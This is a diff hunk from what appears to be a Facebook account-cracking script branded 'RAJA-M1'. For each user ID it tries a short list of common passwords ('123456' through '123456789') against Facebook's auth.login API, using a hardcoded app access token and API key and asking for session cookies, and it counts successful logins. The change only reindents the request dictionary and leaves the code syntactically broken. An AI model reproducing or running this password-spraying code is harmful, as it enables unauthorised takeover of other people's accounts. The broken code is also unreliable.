@@ -466,27 +466,48 @@ def login_1(uid):
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
-            data = '{'
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                    'method': 'auth.login',
+              data = '{'
+        
+        'adid': str(uuid.uuid4()),
+      
+    'format': 'json',
+      
+    'device_id': str(uuid.uuid4()),
+      
+    'cpl': 'true',
+     
+    'family_device_id': str(uuid.uuid4()),
+      
+    'credentials_type': 'device_based_login_password',
+     
+    'error_detail_type': 'button_with_disabled',
+      
+    'source': 'device_based_login',
+     
+    'email': str(uid),
+     
+    'password': str(pw),
+     
+    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+     
+    'generate_session_cookies': '1',
+   
+    'meta_inf_fbmeta': '',
+    
+    'advertiser_id': str(uuid.uuid4()),
+       
+    'currently_logged_in_userid': '0',
+     
+    'locale': 'en_US',
+    
+    'client_country_code': 'US',
+     
+    'method': 'auth.login',
+   
     'fb_api_req_friendly_name': 'authenticate',
+   
     'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+   
     'api_key': '882a8490361d98702bf97a021ddc14d'
 
 
